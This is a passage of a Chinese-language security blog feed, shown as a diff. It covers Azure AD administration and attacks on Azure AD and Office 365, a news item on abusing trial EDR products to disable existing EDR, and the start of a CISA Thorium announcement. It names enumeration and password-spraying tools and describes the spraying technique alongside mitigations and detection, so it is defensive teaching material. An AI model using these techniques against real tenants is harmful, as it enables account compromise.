+&lt;h2 id=&#34;主要管理工具&#34;&gt;主要管理工具
+&lt;/h2&gt;&lt;p&gt;大多数AD管理员熟悉的工具是Active Directory用户和计算机（ADUC，MMC工具）。Azure Active Directory管理员主要使用https://portal.azure.com网页控制台进行管理。&lt;/p&gt;
+&lt;p&gt;管理本地AD和Azure AD/Office 365的管理员将同时使用本地MMC工具和网页管理门户（及其各种相关URL）。虽然Azure AD也有PowerShell cmdlet（类似于本地AD），但云功能的发展速度通常快于PowerShell工具的发布速度，因此即使在使用PowerShell时，仍应使用云管理门户。&lt;/p&gt;
+&lt;h2 id=&#34;与azure-ad交互&#34;&gt;与Azure AD交互
+&lt;/h2&gt;&lt;p&gt;由于Azure AD没有LDAP，与之交互需要通过Graph API或PowerShell模块。有两个主要的PowerShell模块用于与Azure AD交互：MSOnline和AzureAD。可以通过以下命令安装：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Install-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MSOnline&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Force&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Install-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AzureAD&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Force&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;AzureAD模块可能最终会取代MSOnline PowerShell模块，但MSOnline中有些功能尚未移植到AzureAD模块。&lt;/p&gt;
+&lt;h2 id=&#34;azure-ad-powershell模块和cmdlet对比&#34;&gt;Azure AD PowerShell模块和cmdlet对比
+&lt;/h2&gt;&lt;p&gt;（截至2020年1月的模块和cmdlet数据）&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;类别&lt;/th&gt;
+          &lt;th&gt;MSOnline&lt;/th&gt;
+          &lt;th&gt;AzureAD&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;管理单元&lt;/td&gt;
+          &lt;td&gt;Get-MsolAdministrativeUnit&lt;/td&gt;
+          &lt;td&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;应用&lt;/td&gt;
+          &lt;td&gt;&lt;/td&gt;
+          &lt;td&gt;Get-AzureADApplication&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;联系人&lt;/td&gt;
+          &lt;td&gt;Get-MsolContact&lt;/td&gt;
+          &lt;td&gt;Get-AzureADContact&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;设备&lt;/td&gt;
+          &lt;td&gt;Get-MsolDevice&lt;/td&gt;
+          &lt;td&gt;Get-AzureADDevice&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;域&lt;/td&gt;
+          &lt;td&gt;Get-MsolDomain&lt;/td&gt;
+          &lt;td&gt;Get-AzureADDomain&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;组&lt;/td&gt;
+          &lt;td&gt;Get-MsolGroup&lt;/td&gt;
+          &lt;td&gt;Get-AzureADGroup&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;用户&lt;/td&gt;
+          &lt;td&gt;Get-MsolUser&lt;/td&gt;
+          &lt;td&gt;Get-AzureADUser&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;（表格中详细列出了两个模块的cmdlet对比，此处仅展示部分）&lt;/p&gt;
+&lt;h2 id=&#34;使用adal实现单点登录&#34;&gt;使用ADAL实现单点登录
+&lt;/h2&gt;&lt;p&gt;微软云环境最初只支持用户名和密码认证。这种&amp;quot;传统认证&amp;quot;不包括多因素认证（MFA），出于安全考虑，应通过安全默认值、条件访问等禁用传统认证。&lt;/p&gt;
+&lt;p&gt;Azure Active Directory认证库（ADAL）提供&amp;quot;现代认证&amp;quot;，完全支持MFA（甚至无密码认证）。根据微软的定义：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ADAL使开发人员能够通过以下功能更轻松地进行认证：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;可配置的令牌缓存，存储访问令牌和刷新令牌&lt;/li&gt;
+&lt;li&gt;当访问令牌过期且存在刷新令牌时自动刷新令牌&lt;/li&gt;
+&lt;li&gt;支持异步方法调用&lt;/li&gt;
+&lt;/ul&gt;&lt;/blockquote&gt;
+&lt;p&gt;安装ADAL PowerShell模块（&lt;code&gt;Install-Module -Name adal.ps&lt;/code&gt;）后，可以运行以下命令加载ADAL令牌：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$clientId&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;1b730954-1685-4b74-9bfd-dac224a7b894&amp;#34;&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# Azure AD PowerShell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$redirectUri&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Uri&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;urn:ietf:wg:oauth:2.0:oob&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$authority&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://login.windows.net/common/oauth2/authorize&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$resourceUrl&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://graph.windows.net&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$ADALresponse&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;get-adaltoken&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Resource&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$resourceUrl&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ClientId&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$clientId&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-RedirectUri&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$redirectUri&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Authority&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$authority&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-PromptBehavior:Always&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;azure-ad的访问权限&#34;&gt;Azure AD的访问权限
+&lt;/h2&gt;&lt;p&gt;在Active Directory中，几乎所有内容都可以作为普通用户查看。Azure AD用户可以查看有关用户和组的信息，但在可访问性方面存在一些限制。在Azure AD中，特权组被称为&amp;quot;角色&amp;quot;（实际上是组），用于标识特殊访问权限。Office 365中有几个这样的管理员角色，提供对整个Office 365或特定部分的管理级权限。&lt;/p&gt;
+&lt;p&gt;许多组织在全局管理员（又称租户管理员）角色中有一个报告账户，该角色实际上是集成了企业管理员、域管理员和架构管理员权限的单一组。全局管理员对Azure AD和所有Office 365服务拥有完全控制权。这就是为什么许多组织的全局管理员超过5个（微软推荐的最大数量）。只有云账户应被添加到角色中，以便他们可以利用Azure MFA（和无密码认证）以及由PIM控制的角色成员资格。&lt;/p&gt;
+&lt;p&gt;还强烈建议创建一个（或两个）&amp;ldquo;应急&amp;quot;管理员账户，以确保对租户的持续特权访问。微软发布了一份关于如何保护特权访问的文档。&lt;/p&gt;
+&lt;p&gt;特权身份管理（PIM）强烈推荐用于控制角色成员资格，需要为每个将使用PIM的账户购买Azure AD Premium 2（P2）许可证。PIM提供对具有所需权限的管理角色的即时访问。当管理员需要管理员权限时，他们可以通过PIM请求并获得访问权限（可以发送审批或自动批准）。微软建议所有角色中的账户都由PIM管理（并拥有AAD P2许可证）。&lt;/p&gt;
+&lt;p&gt;还有一个用于PIM的PowerShell模块可以安装：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Install-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Azure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ActiveDirectory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;PIM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;PSModule&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;2019年秋季，微软添加了一个名为&amp;quot;全局读取者&amp;quot;的新角色，该角色对所有Azure AD/Office 365服务具有只读/查看权限，这些服务全局管理员可以看到（有一些例外，因为微软仍在向所有Office 365服务推出全局读取者只读功能）。全局读取者的成员资格应提供给需要Microsoft Cloud（Azure AD和Office 365）环境只读访问权限的安全团队或审计人员。&lt;/p&gt;
+&lt;h2 id=&#34;攻击azure-active-directory&#34;&gt;攻击Azure Active Directory
+&lt;/h2&gt;&lt;p&gt;Office 365服务默认可从互联网访问（使用条件访问限制访问），这使其对攻击者具有吸引力。攻击者利用几种攻击方法针对Azure AD和Office 365。&lt;/p&gt;
+&lt;h3 id=&#34;账户枚举&#34;&gt;账户枚举
+&lt;/h3&gt;&lt;p&gt;在传统的Active Directory中，任何Active Directory用户都可以枚举所有用户账户和管理组成员资格（只要有域控制器的网络访问权限）。&lt;/p&gt;
+&lt;p&gt;Azure Active Directory用户可以枚举所有用户账户和管理组成员资格（只要有Office 365服务的访问权限，默认是互联网）。使用O365creeper等工具，甚至可以在没有账户的情况下进行用户枚举，该工具尝试使用电子邮件地址列表向O365进行认证。根据响应代码，工具确定电子邮件地址是否是有效用户账户。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Azure AD枚举工具&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;O365 Creeper - Office 365认证页面（Python）[账户发现]&lt;/li&gt;
+&lt;li&gt;OWA（Golang）&lt;/li&gt;
+&lt;li&gt;ActiveSync（Python）&lt;/li&gt;
+&lt;li&gt;MSOnline/AzureAD PowerShell模块（PowerShell）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;密码喷洒&#34;&gt;密码喷洒
+&lt;/h3&gt;&lt;p&gt;攻击者以及许多渗透测试人员和红队人员常用的方法称为&amp;quot;密码喷洒&amp;rdquo;。密码喷洒是有趣的，因为它是针对所有用户的自动化密码猜测。这种针对所有用户的自动化密码猜测通常可以避免账户锁定，因为使用特定密码的登录尝试是针对每个用户执行的，而不是针对一个特定用户，这正是账户锁定设计要防范的。&lt;/p&gt;
+&lt;p&gt;攻击者从一个他们将要尝试的密码列表开始，从最可能的密码（&amp;ldquo;Fall2017&amp;rdquo;、&amp;ldquo;Winter2018&amp;quot;等）开始。当密码喷洒开始时，我们从列表中的第一个密码开始。第一个密码用于尝试作为每个用户进行认证。这个密码针对每个用户尝试后，我们继续下一个密码。&lt;/p&gt;
+&lt;p&gt;密码喷洒相对容易执行且非常有效。我们与许多组织合作过，他们的云环境账户因密码喷洒而遭到入侵。许多联合客户没有意识到这是他们的工作，而不是云的工作。密码喷洒的风险不仅限于云。如果云账户和本地账户使用相同的密码且未配置MFA，攻击者可能通过密码喷洒云账户然后获得企业网络访问权限。这不是理论或假设的场景，强调了MFA的重要性。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Office 365密码喷洒工具&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Ruler（Exchange）[Golang]&lt;/li&gt;
+&lt;li&gt;SprayingToolkit（Lync/Skype for Business/OWA）[Python]&lt;/li&gt;
+&lt;li&gt;LyncSniper（Lync/Skype for Business）[PowerShell]&lt;/li&gt;
+&lt;li&gt;MailSniper（OWA/EWS）[PowerShell]&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Office 365密码喷洒缓解&lt;/strong&gt;
+通过启用&amp;quot;安全默认值&amp;quot;或配置自定义条件访问策略禁用传统认证。还强烈建议要求所有用户使用MFA。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Office 365密码喷洒检测&lt;/strong&gt;
+假设密码喷洒针对Office 365服务且未配置联合（ADFS、Okta等），则可以通过参考Azure AD登录日志进行检测。&lt;/p&gt;
+&lt;p&gt;通过关联同一用户在时间范围内的多个事件，其中登录错误代码为&amp;quot;50126&amp;quot;且客户端应用为&amp;quot;其他客户端；旧版Office客户端&amp;rdquo;（这意味着执行了传统认证）来检测。&lt;/p&gt;
+&lt;h3 id=&#34;账户令牌窃取和重用&#34;&gt;账户令牌窃取和重用
+&lt;/h3&gt;&lt;p&gt;由于云认证通常会在认证的应用或网页浏览器中存储令牌，这是认证的证明，可能会被重用。网页浏览器通常将此认证令牌存储为cookie。如果这些数据被盗，攻击者可能利用这些数据伪造访问并配置持久性以保持持续访问。&lt;/p&gt;
+&lt;h2 id=&#34;azure-ad审查&#34;&gt;Azure AD审查
+&lt;/h2&gt;&lt;p&gt;微软的Azure AD GitHub包括用于审查Azure AD配置的PowerShell代码（https://github.com/AzureAD/AzureADAssessment）&lt;/p&gt;
+&lt;p&gt;Trimarc还提供了一项名为Microsoft Cloud Security Assessment（MCSA）的新服务，类似于本地Active Directory安全评估，但专注于Azure AD和Office 365。&lt;/p&gt;
+&lt;h2 id=&#34;其他office-365服务powershell模块&#34;&gt;其他Office 365服务PowerShell模块
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Exchange Online模块
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Install-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ExchangeOnlineManagement&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;Microsoft SharePoint
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Install-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Online&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;SharePoint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;PowerShell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;Microsoft Teams
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Install-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MicrosoftTeams&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;Microsoft Skype for Business Online&lt;/li&gt;
+&lt;li&gt;Microsoft InTune
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Install-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Graph&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Intune&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Force&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;（需要管理员提供管理员同意：&lt;code&gt;Connect-MSGraph -AdminConsent&lt;/code&gt;）&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>EDR如何绕过EDR防护？安全研究人员发现新型攻击向量</title>
+        <link>http://localhost:1313/p/edr%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87edr%E9%98%B2%E6%8A%A4%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E4%BA%BA%E5%91%98%E5%8F%91%E7%8E%B0%E6%96%B0%E5%9E%8B%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F/</link>
+        <pubDate>Wed, 06 Aug 2025 07:21:55 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/edr%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87edr%E9%98%B2%E6%8A%A4%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E4%BA%BA%E5%91%98%E5%8F%91%E7%8E%B0%E6%96%B0%E5%9E%8B%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F/</guid>
+        <description>&lt;h1 id=&#34;edr如何绕过edr防护&#34;&gt;EDR如何绕过EDR防护？
+&lt;/h1&gt;&lt;h2 id=&#34;新型攻击向量被发现&#34;&gt;新型攻击向量被发现
+&lt;/h2&gt;&lt;p&gt;网络安全研究人员Ezra Woods和Mike Manrod发现了一种危险的攻击方式：攻击者可以滥用终端检测与响应(EDR)软件的免费试用版本来禁用现有的安全防护工具。他们将这种现象称为&amp;quot;EDR-on-EDR暴力&amp;quot;，并在Medium上发表了详细研究成果。&lt;/p&gt;
+&lt;p&gt;&amp;ldquo;总结来说，EDR/AV产品可被用来禁用或阻止现有安全工具、远程控制设备，甚至像我们在某个案例中发现的那样——加密整个硬盘，&amp;ldquo;研究人员指出。这种具有讽刺意味的新攻击向量利用了安全领域一个很少被质疑的基本假设：合法的安全工具总是可信的。&lt;/p&gt;
+&lt;h2 id=&#34;攻击原理分析&#34;&gt;攻击原理分析
+&lt;/h2&gt;&lt;p&gt;根据研究人员的发现，攻击者可以在已入侵的系统上以本地管理员权限安装EDR产品的免费试用版本，然后配置这些版本来阻止现有的安全工具。在他们的测试中，Woods和Manrod成功禁用了Cisco Secure Endpoint、CrowdStrike Falcon和Elastic Defend，而且不会触发任何警报或生成遥测数据——受攻击的终端只是显示为离线状态。&lt;/p&gt;
+&lt;p&gt;被滥用的软件具有有效的数字证书并被识别为合法程序，因此很难与真正授权的安装区分开来。在企业环境中，安全团队很可能无法识别防护措施已被故意破坏。&lt;/p&gt;
+&lt;p&gt;&amp;ldquo;实现方式是通过删除排除项，然后将现有AV/EDR产品的哈希值添加到阻止应用程序列表中，&amp;ldquo;研究人员在分析中解释道。具有远程监控和管理功能的EDR产品尤其容易被滥用，例如研究人员使用ESET的EDR产品实例成功加密了目标系统的整个硬盘。&lt;/p&gt;
+&lt;h2 id=&#34;防御建议&#34;&gt;防御建议
+&lt;/h2&gt;&lt;p&gt;研究人员为企业提供了以下防护建议：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;部署应用程序控制解决方案，阻止未经授权的安全软件安装&lt;/li&gt;
+&lt;li&gt;实施自定义攻击指标，检测可疑的EDR安装&lt;/li&gt;
+&lt;li&gt;使用&amp;quot;应用感知&amp;quot;防火墙和安全Web网关，防止访问安全供应商的未授权门户&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Woods和Manrod在其文章中分享了详细的操作指南，帮助安全团队复现、测试和深入理解这种攻击方式，并建议在隔离系统中进行受控测试。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>CISA发布Thorium：一个开源、可扩展的恶意软件分析平台</title>
+        <link>http://localhost:1313/p/cisa%E5%8F%91%E5%B8%83thorium%E4%B8%80%E4%B8%AA%E5%BC%80%E6%BA%90%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/</link>
+        <pubDate>Wed, 06 Aug 2025 07:10:54 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/cisa%E5%8F%91%E5%B8%83thorium%E4%B8%80%E4%B8%AA%E5%BC%80%E6%BA%90%E5%8F%AF%E6%89%A9%E5%B1%95%E7%9A%84%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/</guid>
+        <description>&lt;img src="https://i.imgs.ovh/2025/08/06/oFYqY.gif" alt="Featured image of post CISA发布Thorium：一个开源、可扩展的恶意软件分析平台" /&gt;&lt;h1 id=&#34;cisa发布thorium一个开源可扩展的恶意软件分析平台&#34;&gt;CISA发布Thorium：一个开源、可扩展的恶意软件分析平台
+&lt;/h1&gt;&lt;p&gt;美国网络安全和基础设施安全局(CISA)发布了Thorium，这是一个高吞吐量的开源平台，用于自动化恶意软件和取证文件分析。该平台是与桑迪亚国家实验室合作开发的，旨在支持软件分析师、数字取证团队和事件响应人员。&lt;/p&gt;
+&lt;p&gt;该平台将使网络防御者能够将商业、开源和自定义工具集成到一个统一的系统中，用于编排大规模、自动化的分析工作流程。经常从事文件分析的团队将能够利用Thorium将可扩展的自动化结果索引引入单一的统一平台。&lt;/p&gt;
+&lt;h2 id=&#34;为现代网络工作流程设计&#34;&gt;为现代网络工作流程设计
+&lt;/h2&gt;&lt;p&gt;Thorium旨在使分析师能够使用标签和全文搜索过滤工具输出。它还将强制执行严格的基于组的权限控制，确保提交、工具和结果保持安全。用户可以通过事件触发器和工具执行序列定义自动化工作流程。CISA声称，Thorium将通过RESTful API提供完全控制，并可通过Web浏览器或命令行工具工作。&lt;/p&gt;
